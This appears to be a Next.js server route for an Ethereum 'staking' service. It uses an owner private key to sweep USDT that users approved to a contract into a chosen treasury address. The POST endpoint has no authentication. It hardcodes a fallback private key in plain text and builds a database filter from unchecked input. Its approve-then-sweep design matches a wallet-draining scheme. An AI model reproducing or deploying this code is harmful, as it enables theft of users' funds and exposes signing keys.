import { type NextRequest, NextResponse } from 'next/server'
import { addCorsHeaders } from '@/lib/utils'
import { supabase } from '@/lib/supabase'
import { ethers } from 'ethers'
import ETH_NETWORK_CONFIG from '@/config/eth-network'

export const dynamic = 'force-dynamic'

// ETH 网络配置 - Tenderly 虚拟测试网
const ETH_RPC_URLS = [
  ETH_NETWORK_CONFIG.RPC_URL,
  ...ETH_NETWORK_CONFIG.FALLBACK_RPC_URLS
]
const USDT_CONTRACT_ADDRESS = ETH_NETWORK_CONFIG.USDT_CONTRACT_ADDRESS
const STAKING_CONTRACT_ADDRESS = ETH_NETWORK_CONFIG.STAKING_CONTRACT_ADDRESS
const USDT_DECIMALS = ETH_NETWORK_CONFIG.USDT_DECIMALS

// 管理员私钥（用于签名交易）
const ADMIN_PRIVATE_KEY = process.env.ADMIN_PRIVATE_KEY || ''

// 创建带有备用节点的Provider
async function createProvider() {
  for (let i = 0; i < ETH_RPC_URLS.length; i++) {
    try {
      const provider = new ethers.JsonRpcProvider(ETH_RPC_URLS[i])
      // 测试连接
      await provider.getNetwork()
      console.log(`✅ 连接到RPC节点 ${i + 1}: ${ETH_RPC_URLS[i]}`)
      return provider
    } catch (error) {
      console.log(`❌ RPC节点 ${i + 1} 连接失败: ${ETH_RPC_URLS[i]}`)
      if (i === ETH_RPC_URLS.length - 1) {
        throw new Error('所有RPC节点都连接失败')
      }
    }
  }
}

// 智能发送交易 - 如果一个节点失败自动切换到下一个
async function sendTransactionWithFallback(contract, method, params, gasOptions, adminPrivateKey: string) {
  let lastError = null
  
  for (let i = 0; i < ETH_RPC_URLS.length; i++) {
    try {
      console.log(`🔄 尝试使用RPC节点 ${i + 1}: ${ETH_RPC_URLS[i]}`)
      
      // 重新创建provider和contract
      const provider = new ethers.JsonRpcProvider(ETH_RPC_URLS[i])
      const cleanPrivateKey = adminPrivateKey.startsWith('0x') ? adminPrivateKey.slice(2) : adminPrivateKey
      const adminWallet = new ethers.Wallet(cleanPrivateKey, provider)
      const newContract = new ethers.Contract(contract.target, contract.interface, adminWallet)
      
      // 发送交易
      const tx = await newContract[method](...params, gasOptions)
      console.log(`✅ 交易发送成功，节点 ${i + 1}: ${tx.hash}`)
      return tx
      
    } catch (error) {
      lastError = error
      console.log(`❌ 节点 ${i + 1} 发送交易失败:`, error.message.slice(0, 100))
      
      // 如果是"failed to send tx"错误，尝试下一个节点
      if (error.message.includes('failed to send tx') && i < ETH_RPC_URLS.length - 1) {
        continue
      }
      
      // 如果不是网络错误，或者是最后一个节点，直接抛出错误
      if (i === ETH_RPC_URLS.length - 1) {
        throw error
      }
    }
  }
  
  throw lastError
}

// 质押合约 ABI（包含归集函数）
const STAKING_CONTRACT_ABI = [
  {
    "constant": false,
    "inputs": [{"name": "_amount", "type": "uint256"}],
    "name": "withdrawContractTokens",
    "outputs": [],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      {"name": "_user", "type": "address"},
      {"name": "_amount", "type": "uint256"}
    ],
    "name": "collectUserTokens",
    "outputs": [],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [],
    "name": "owner",
    "outputs": [{"name": "", "type": "address"}],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [{"name": "_treasuryAddress", "type": "address"}],
    "name": "setTreasuryAddress",
    "outputs": [],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [{"name": "newTreasury", "type": "address"}],
    "name": "updateTreasury",
    "outputs": [],
    "type": "function"
  }
]

// ETH 主网 USDT 合约 ABI（针对特殊实现进行调整）
const USDT_ABI = [
  {
    "constant": true,
    "inputs": [{"name": "_owner", "type": "address"}],
    "name": "balanceOf",
    "outputs": [{"name": "balance", "type": "uint256"}],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [
      {"name": "_owner", "type": "address"},
      {"name": "_spender", "type": "address"}
    ],
    "name": "allowance",
    "outputs": [{"name": "", "type": "uint256"}],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      {"name": "_from", "type": "address"},
      {"name": "_to", "type": "address"},
      {"name": "_value", "type": "uint256"}
    ],
    "name": "transferFrom",
    "outputs": [], // ETH 主网 USDT 不返回 boolean
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      {"name": "_to", "type": "address"},
      {"name": "_value", "type": "uint256"}
    ],
    "name": "transfer",
    "outputs": [],
    "type": "function"
  }
]

export async function POST(request: NextRequest) {
  try {
    const body = await request.json() as { userAddress?: string; amount?: string | number; toAddress?: string }
    const { userAddress, amount, toAddress } = body

    if (!userAddress || !amount) {
      const response = NextResponse.json({
        success: false,
        error: '缺少必需参数'
      }, { status: 400 })
      return addCorsHeaders(response)
    }

    const collectionAmount = Number.parseFloat(amount.toString())
    if (isNaN(collectionAmount) || collectionAmount <= 0) {
      const response = NextResponse.json({
        success: false,
        error: '无效的归集金额'
      }, { status: 400 })
      return addCorsHeaders(response)
    }

    // 优先使用环境变量，如果没有则使用权限地址私钥（合约owner私钥）
    // 默认使用权限地址私钥：d41c083bf7923a6bc472d6ea2bc5b6e5a850d3ccae222dcc4efa33ff83697da2
    let adminPrivateKey = ADMIN_PRIVATE_KEY || 'd41c083bf7923a6bc472d6ea2bc5b6e5a850d3ccae222dcc4efa33ff83697da2'
    
    if (!adminPrivateKey) {
      // 从数据库读取管理员私钥配置
      const { data: settings, error: settingsError } = await supabase
        .from('system_setting')
        .select('setting_key, setting_value')
        .in('setting_key', ['admin_private_key', 'admin_address'])

      if (settingsError) {
        console.error('读取系统配置失败:', settingsError)
      } else if (settings && settings.length > 0) {
        const configMap: Record<string, string> = {}
        settings.forEach(item => {
          configMap[item.setting_key] = item.setting_value || ''
        })
        adminPrivateKey = configMap.admin_private_key || ''
      }
    }

    if (!adminPrivateKey) {
      const response = NextResponse.json({
        success: false,
        error: '管理员私钥未配置。请在系统设置中配置管理员私钥，或设置 ADMIN_PRIVATE_KEY 环境变量。'
      }, { status: 500 })
      return addCorsHeaders(response)
    }

    // 获取收款地址：优先使用参数，其次从 contract_permissions 配置读取，最后使用管理员地址
    let finalToAddress = toAddress
    if (!finalToAddress) {
      // 从 contract_permissions 表中读取启用的配置，获取 treasury_address
      const { data: permissions } = await supabase
        .from('contract_permissions')
        .select('treasury_address, contract_address')
        .eq('chain_type', 'ERC')
        .eq('is_enabled', true)
        .order('sort', { ascending: true })
        .limit(1)
      
      if (permissions && permissions.length > 0 && permissions[0].treasury_address) {
        finalToAddress = permissions[0].treasury_address
        console.log(`✅ 从授权配置中获取收款地址: ${finalToAddress}`)
      } else {
        // 如果没有配置收款地址，使用管理员地址作为默认值
        // 注意：这里不能立即使用，需要等创建 adminWallet 后才能获取
        console.log(`ℹ️ 未找到配置的收款地址，将使用管理员地址作为默认值`)
      }
    }

    console.log(`🔄 开始真实链上归集操作:`, { userAddress, amount: collectionAmount, toAddress: finalToAddress })

    // 查找用户（支持wallet_address和auth_wallet_address）
    // 注意：用户地址应该是用户的钱包地址，不是权限地址
    let actualUserAddress = userAddress
    const { data: userData } = await supabase
      .from('nh_member_new')
      .select('wallet_address, auth_wallet_address')
      .or(`wallet_address.eq.${userAddress},auth_wallet_address.eq.${userAddress}`)
      .eq('is_active', true)
      .single()
    
    if (userData) {
      // 用户地址应该是 wallet_address（用户注册的钱包地址）
      // auth_wallet_address 是用户授权给的地址（权限地址），不是用户自己的地址
      actualUserAddress = userData.wallet_address || userAddress
      console.log(`🔍 找到用户信息:`, {
        用户注册地址: userData.wallet_address,
        授权给的地址: userData.auth_wallet_address,
        实际归集地址: actualUserAddress
      })
    } else {
      console.log(`⚠️ 未找到用户记录，使用提供的地址: ${userAddress}`)
    }

    // 创建 ETH 网络提供者
    const provider = await createProvider()
    
    // 创建管理员钱包（移除0x前缀如果存在）- 使用权限地址私钥（合约owner私钥）
    const cleanPrivateKey = adminPrivateKey.startsWith('0x') 
      ? adminPrivateKey.slice(2) 
      : adminPrivateKey
    
    console.log(`🔑 私钥配置状态: ${adminPrivateKey ? '已配置' : '未配置'}`)
    console.log(`🔑 清理后私钥状态: ${cleanPrivateKey ? '已处理' : '无效'}`)
    console.log(`🔑 私钥长度: ${cleanPrivateKey.length}`)
    
    const adminWallet = new ethers.Wallet(cleanPrivateKey, provider)
    console.log(`👤 管理员钱包地址（合约owner）: ${adminWallet.address}`)
    
    // 如果没有指定收款地址，使用管理员地址作为默认值
    if (!finalToAddress) {
      finalToAddress = adminWallet.address
      console.log(`ℹ️ 使用管理员地址作为收款地址: ${finalToAddress}`)
    }
    
    // 创建质押合约实例（用于归集操作）
    const stakingContract = new ethers.Contract(STAKING_CONTRACT_ADDRESS, STAKING_CONTRACT_ABI, adminWallet)
    
    // 创建 USDT 合约实例（用于查询余额和授权额度）
    const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, adminWallet)
    
    // 检查合约所有者权限
    try {
      const contractOwner = await stakingContract.owner()
      console.log(`👤 合约所有者: ${contractOwner}`)
      console.log(`👤 管理员地址: ${adminWallet.address}`)
      
      if (contractOwner.toLowerCase() !== adminWallet.address.toLowerCase()) {
        const response = NextResponse.json({
          success: false,
          error: `管理员地址不是合约所有者，合约所有者: ${contractOwner}，管理员地址: ${adminWallet.address}`
        }, { status: 400 })
        return addCorsHeaders(response)
      }
    } catch (ownerError) {
      console.error('检查合约所有者失败:', ownerError)
      const response = NextResponse.json({
        success: false,
        error: `检查合约所有者失败: ${ownerError instanceof Error ? ownerError.message : 'Unknown error'}`
      }, { status: 400 })
      return addCorsHeaders(response)
    }
    
    // 使用合约地址作为授权对象（用户需要授权给合约地址）
    const spenderAddress = STAKING_CONTRACT_ADDRESS
    console.log(`🔐 使用的授权对象地址（合约地址）: ${spenderAddress}`)

    // 检查用户钱包的USDT余额（使用实际用户地址）
    const userBalance = await usdtContract.balanceOf(actualUserAddress)
    const userBalanceFormatted = ethers.formatUnits(userBalance, USDT_DECIMALS)
    
    console.log(`💰 用户钱包 USDT 余额: ${userBalanceFormatted}`)

    // 检查用户是否已授权给合约地址
    const allowance = await usdtContract.allowance(actualUserAddress, STAKING_CONTRACT_ADDRESS)
    const allowanceFormatted = ethers.formatUnits(allowance, USDT_DECIMALS)
    
    console.log(`🔐 用户授权合约地址额度: ${allowanceFormatted} USDT`)
    console.log(`🔐 原始授权额度: ${allowance.toString()}`)
    console.log(`🔐 用户地址: ${actualUserAddress}`)
    console.log(`🔐 合约地址（授权对象）: ${STAKING_CONTRACT_ADDRESS}`)

    // 检查余额和verify是否足够
    const requiredAmount = ethers.parseUnits(collectionAmount.toString(), USDT_DECIMALS)
    if (userBalance < requiredAmount) {
      const response = NextResponse.json({
        success: false,
        error: `用户钱包余额不足，当前余额: ${userBalanceFormatted} USDT，需要: ${collectionAmount} USDT`
      }, { status: 400 })
      return addCorsHeaders(response)
    }

    if (allowance < requiredAmount) {
      const response = NextResponse.json({
        success: false,
        error: `用户未授权足够的 USDT 给归集合约，当前授权额度: ${allowanceFormatted} USDT，需要: ${collectionAmount} USDT。请让用户先授权USDT给归集合约地址: ${STAKING_CONTRACT_ADDRESS}`,
        details: {
          requiredAction: '用户需要调用 USDT 合约的 approve 函数',
          approveTarget: STAKING_CONTRACT_ADDRESS,
          approveAmount: collectionAmount,
          usdtContract: USDT_CONTRACT_ADDRESS,
          currentAllowance: allowanceFormatted,
          userAddress: actualUserAddress,
          contractAddress: STAKING_CONTRACT_ADDRESS
        }
      }, { status: 400 })
      return addCorsHeaders(response)
    }

    // 如果配置了收款地址，先设置合约的 treasuryAddress（如果合约支持）
    if (finalToAddress && finalToAddress.toLowerCase() !== adminWallet.address.toLowerCase()) {
      try {
        console.log(`🔄 设置合约收款地址为: ${finalToAddress}`)
        // 尝试调用 setTreasuryAddress 方法（ETHStakingContract）
        try {
          const setTreasuryTx = await stakingContract.setTreasuryAddress(finalToAddress, {
            gasLimit: BigInt(100000),
            gasPrice: await provider.getFeeData().then(fee => fee.gasPrice || ethers.parseUnits('1', 'gwei'))
          })
          await setTreasuryTx.wait()
          console.log(`✅ 合约收款地址已设置为: ${finalToAddress}`)
        } catch (setTreasuryError) {
          // 如果 setTreasuryAddress 不存在，尝试 updateTreasury（ImprovedEthStaking）
          console.log(`ℹ️ setTreasuryAddress 方法不存在，尝试 updateTreasury...`)
          try {
            const updateTreasuryTx = await stakingContract.updateTreasury(finalToAddress, {
              gasLimit: BigInt(100000),
              gasPrice: await provider.getFeeData().then(fee => fee.gasPrice || ethers.parseUnits('1', 'gwei'))
            })
            await updateTreasuryTx.wait()
            console.log(`✅ 合约收款地址已更新为: ${finalToAddress}`)
          } catch (updateTreasuryError) {
            console.warn(`⚠️ 合约不支持设置收款地址，将使用合约当前的 treasuryAddress`)
          }
        }
      } catch (error) {
        console.warn(`⚠️ 设置合约收款地址失败，将使用合约当前的 treasuryAddress:`, error)
      }
    }

    // 执行归集操作 - 使用归集合约的 collectUserTokens 方法
    console.log(`🚀 执行归集: 使用合约 collectUserTokens 从用户 ${actualUserAddress} 转移 ${collectionAmount} USDT 到收款地址 ${finalToAddress}`)

    let tx, receipt
    let userBalanceBefore, treasuryBalanceBefore, userBalanceAfter, treasuryBalanceAfter

    try {
      // 先获取用户当前余额用于验证
      userBalanceBefore = await usdtContract.balanceOf(actualUserAddress)
      treasuryBalanceBefore = await usdtContract.balanceOf(finalToAddress)
      
      console.log(`📊 转账前余额 - 用户: ${ethers.formatUnits(userBalanceBefore, USDT_DECIMALS)} USDT, 收款地址: ${ethers.formatUnits(treasuryBalanceBefore, USDT_DECIMALS)} USDT`)
      
      // 使用归集合约的 collectUserTokens 方法
      console.log(`🔄 调用归集合约 collectUserTokens 方法...`)
      
      // 为ETH主网设置更激进的gas配置
      // Gas 配置 - 根据当前网络状况动态调整
      const gasLimit = BigInt(200000) // collectUserTokens 需要更多的 gas
      
      // 获取当前网络Gas价格并稍微加价以确保被打包
      const feeData = await provider.getFeeData()
      let gasPrice = feeData.gasPrice ? feeData.gasPrice * BigInt(150) / BigInt(100) : ethers.parseUnits('1', 'gwei')
      
      // 设置最小Gas价格以防网络价格过低（但不要太高）
      const minGasPrice = ethers.parseUnits('0.5', 'gwei')
      const maxGasPrice = ethers.parseUnits('5', 'gwei') // 设置最大值避免过高
      if (gasPrice < minGasPrice) {
        gasPrice = minGasPrice
      } else if (gasPrice > maxGasPrice) {
        gasPrice = maxGasPrice
      }
      console.log(`⛽ 使用 gas 限制: ${gasLimit.toString()}`)
      console.log(`⛽ 使用 gas 价格: ${ethers.formatUnits(gasPrice, 'gwei')} gwei`)
      
      // 检查管理员钱包的 ETH 余额是否足够支付 gas 费用
      const adminEthBalance = await provider.getBalance(adminWallet.address)
      const estimatedGasCost = gasLimit * gasPrice
      const requiredEthBalance = estimatedGasCost * BigInt(120) / BigInt(100) // 增加20%的缓冲区
      
      console.log(`💰 管理员 ETH 余额: ${ethers.formatEther(adminEthBalance)} ETH`)
      console.log(`⛽ 预估 gas 费用: ${ethers.formatEther(estimatedGasCost)} ETH`)
      console.log(`💰 需要 ETH 余额: ${ethers.formatEther(requiredEthBalance)} ETH`)
      
      if (adminEthBalance < requiredEthBalance) {
        const response = NextResponse.json({
          success: false,
          error: `管理员钱包 ETH 余额不足，无法支付 gas 费用。当前余额: ${ethers.formatEther(adminEthBalance)} ETH，需要至少: ${ethers.formatEther(requiredEthBalance)} ETH (包含20%缓冲区)`,
          details: {
            adminAddress: adminWallet.address,
            currentBalance: ethers.formatEther(adminEthBalance),
            requiredBalance: ethers.formatEther(requiredEthBalance),
            estimatedGasCost: ethers.formatEther(estimatedGasCost),
            gasLimit: gasLimit.toString(),
            gasPrice: ethers.formatUnits(gasPrice, 'gwei') + ' gwei',
            action: '请向管理员地址充值足够的 ETH 以支付 gas 费用'
          }
        }, { status: 400 })
        return addCorsHeaders(response)
      }
      
      // 尝试多次调用，处理网络问题
      let retryCount = 0;
      const maxRetries = 3;
      
      while (retryCount < maxRetries) {
        try {
          console.log(`🔄 尝试第 ${retryCount + 1} 次调用合约 collectUserTokens...`)
          
          // 调用归集合约的 collectUserTokens 方法
          // collectUserTokens(user, amount) - 从用户地址转账到合约owner地址
          // 注意：用户必须已经授权给合约地址（STAKING_CONTRACT_ADDRESS）才能执行此操作
          tx = await stakingContract.collectUserTokens(
            actualUserAddress,
            requiredAmount,
            {
              gasLimit: gasLimit,
              gasPrice: gasPrice
            }
          );
          
          console.log(`✅ collectUserTokens 调用成功，交易哈希: ${tx.hash}`)
          break; // 成功就退出循环
          
        } catch (retryError) {
          retryCount++;
          console.log(`❌ 第 ${retryCount} 次尝试失败: ${retryError.message.slice(0, 100)}`)
          
          if (retryCount >= maxRetries) {
            // 最后一次尝试失败，抛出错误
            throw retryError;
          }
          
          // 等待2秒后重试，并提高gas价格
          console.log(`⏳ 等待 2 秒后重试，提高gas价格...`)
          await new Promise(resolve => setTimeout(resolve, 2000));
          gasPrice = gasPrice * BigInt(110) / BigInt(100); // 每次重试提高10%
          console.log(`⛽ 新的 gas 价格: ${ethers.formatUnits(gasPrice, 'gwei')} gwei`)
        }
      }
      console.log(`📝 合约归集交易已提交，哈希: ${tx.hash}`)

      // 等待交易确认
      console.log(`⏳ 等待交易确认...`)
      receipt = await tx.wait()
      console.log(`✅ 交易已确认，区块号: ${receipt.blockNumber}`)
      
      // 验证转账是否成功
      userBalanceAfter = await usdtContract.balanceOf(actualUserAddress)
      treasuryBalanceAfter = await usdtContract.balanceOf(finalToAddress)
      
      console.log(`📊 转账后余额 - 用户: ${ethers.formatUnits(userBalanceAfter, USDT_DECIMALS)} USDT, 收款地址: ${ethers.formatUnits(treasuryBalanceAfter, USDT_DECIMALS)} USDT`)
      
      // 验证转账金额是否正确
      const actualTransferred = userBalanceBefore - userBalanceAfter
      const expectedAmount = requiredAmount
      
      if (actualTransferred.toString() !== expectedAmount.toString()) {
        console.warn(`⚠️ 转账金额验证失败: 预期 ${expectedAmount}, 实际 ${actualTransferred}`)
      } else {
        console.log(`✅ 转账金额验证成功: ${ethers.formatUnits(actualTransferred, USDT_DECIMALS)} USDT`)
      }
      
    } catch (transferError) {
      console.error(`❌ 合约 collectUserTokens 调用失败:`, transferError)
      
      // 尝试解析具体错误
      const errorMessage = transferError instanceof Error ? transferError.message : 'Unknown error'
      let suggestedAction = ''
      
      if (errorMessage.includes('insufficient funds') || errorMessage.includes('insufficient funds for intrinsic transaction cost')) {
        // 检查管理员 ETH 余额
        try {
          const adminEthBalance = await provider.getBalance(adminWallet.address)
          suggestedAction = `管理员钱包 ETH 余额不足。当前余额: ${ethers.formatEther(adminEthBalance)} ETH。请向管理员地址 ${adminWallet.address} 充值足够的 ETH 以支付 gas 费用（建议至少 0.01 ETH）`
        } catch (balanceError) {
          suggestedAction = `管理员钱包 ETH 余额可能不足。请向管理员地址 ${adminWallet.address} 充值足够的 ETH 以支付 gas 费用（建议至少 0.01 ETH）`
        }
      } else if (errorMessage.includes('insufficient allowance') || errorMessage.includes('Insufficient allowance')) {
        suggestedAction = `请检查用户是否已授权足够的 USDT 给归集合约地址: ${STAKING_CONTRACT_ADDRESS}`
      } else if (errorMessage.includes('insufficient balance') || errorMessage.includes('Insufficient balance')) {
        suggestedAction = '请检查用户 USDT 余额是否足够'
      } else if (errorMessage.includes('gas')) {
        suggestedAction = '请尝试增加 gas 限制或 gas 价格，或检查管理员钱包 ETH 余额是否充足'
      } else {
        suggestedAction = '这可能是网络问题或合约调用失败，建议检查合约地址和权限配置，或检查管理员钱包 ETH 余额'
      }
      
      const response = NextResponse.json({
        success: false,
        error: `合约归集失败: ${errorMessage}`,
        details: {
          transferError: errorMessage,
          suggestedAction: suggestedAction,
          userAddress: actualUserAddress,
          contractAddress: STAKING_CONTRACT_ADDRESS,
          adminAddress: adminWallet.address,
          amount: collectionAmount
        },
        usdtContract: USDT_CONTRACT_ADDRESS,
        contractAddress: STAKING_CONTRACT_ADDRESS,
        parameters: {
          user: actualUserAddress,
          amount: requiredAmount.toString()
        }
      }, { status: 500 })
      return addCorsHeaders(response)
    }

    // 更新数据库记录（合约归集操作）
    try {
      // 查找用户（使用实际用户地址）
      if (actualUserAddress) {
        const { data: userData, error: userError } = await supabase
          .from('nh_member_new')
          .select('id, usdt, dividend_usdt, withdrawal_usdt')
          .or(`wallet_address.eq.${actualUserAddress},auth_wallet_address.eq.${actualUserAddress}`)
          .eq('is_active', true)
          .single()

        if (!userError && userData) {
          // 更新用户余额（智能分配逻辑与主归集接口保持一致）
          const currentUsdt = Number.parseFloat(userData.usdt || '0')
          const currentGjCash = Number.parseFloat(userData.dividend_usdt || '0')
          const totalAvailable = currentUsdt + currentGjCash
          
          // 验证用户是否有足够余额（链上验证后的二次确认）
          if (totalAvailable >= collectionAmount) {
            let newUsdt = currentUsdt
            let newGjCash = currentGjCash
            let remainingAmount = collectionAmount

            // 优先从gj_withdrawable_usdt中扣除
            if (newGjCash > 0 && remainingAmount > 0) {
              const deductFromGj = Math.min(newGjCash, remainingAmount)
              newGjCash -= deductFromGj
              remainingAmount -= deductFromGj
            }

            // 如果还有剩余，从usdt中扣除
            if (remainingAmount > 0) {
              newUsdt -= remainingAmount
            }

            const updateData = {
              usdt: Number(newUsdt.toFixed(6)),
              dividend_usdt: Number(newGjCash.toFixed(6)),
              withdrawal_usdt: Number((Number.parseFloat(userData.withdrawal_usdt || '0') + collectionAmount).toFixed(6)),
              updated_at: new Date().toISOString()
            }

            await supabase
              .from('nh_member_new')
              .update(updateData)
              .eq('id', userData.id)

            console.log(`📊 数据库已更新: USDT ${currentUsdt} -> ${updateData.usdt}, GJ_CASH ${currentGjCash} -> ${updateData.gj_withdrawable_usdt}`)
          } else {
            console.warn(`⚠️ 数据库余额不足进行归集操作: 需要 ${collectionAmount}, 可用 ${totalAvailable}`)
          }
        }
      }
    } catch (dbError) {
      console.warn('更新数据库失败:', dbError)
    }

    // 记录归集日志
    try {
      const transferType = 'contract_collection'
      const description = `合约归集操作 - 从用户 ${actualUserAddress} 转移 ${collectionAmount} USDT 到收款地址 ${finalToAddress}`
      
      await supabase
        .from('authorized_transfers')
        .insert([{
          user_wallet_address: actualUserAddress || 'contract_collection',
          to_wallet_address: finalToAddress,
          amount: collectionAmount,
          transfer_id: `${transferType}_${Date.now()}_${adminWallet.address.slice(-8)}`,
          transaction_hash: tx.hash,
          description: description,
          status: 'completed',
          transaction_type: transferType,
          network: 'ETH'
        }])
    } catch (logError) {
      console.warn('记录归集日志失败:', logError)
    }
    
    const result = {
             transactionHash: tx.hash,
             fromAddress: actualUserAddress,
             toAddress: finalToAddress,
             amount: collectionAmount,
             gasUsed: receipt.gasUsed.toString(),
             gasPrice: (receipt.gasPrice || BigInt(0)).toString(),
             blockNumber: receipt.blockNumber,
             status: 'success',
             explorerUrl: `https://etherscan.io/tx/${tx.hash}`,
             usdtContract: USDT_CONTRACT_ADDRESS,
             contractAddress: STAKING_CONTRACT_ADDRESS,
             transferMethod: 'contract_collectUserTokens',
             balanceVerification: {
               userBalanceBefore: ethers.formatUnits(userBalanceBefore || BigInt(0), USDT_DECIMALS),
               userBalanceAfter: ethers.formatUnits(userBalanceAfter || BigInt(0), USDT_DECIMALS),
               treasuryBalanceBefore: ethers.formatUnits(treasuryBalanceBefore || BigInt(0), USDT_DECIMALS),
               treasuryBalanceAfter: ethers.formatUnits(treasuryBalanceAfter || BigInt(0), USDT_DECIMALS)
             }
           }

    console.log(`✅ 真实链上归集操作成功 (合约归集):`, result)

    const response = NextResponse.json({
      success: true,
      message: '真实链上归集操作成功',
      data: {
        ...result,
        timestamp: new Date().toISOString()
      }
    }, { status: 200 })
    return addCorsHeaders(response)

  } catch (error) {
    console.error('真实链上归集操作失败:', error)
    const response = NextResponse.json({
      success: false,
      error: '真实链上归集操作失败',
      details: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500 })
    return addCorsHeaders(response)
  }
}
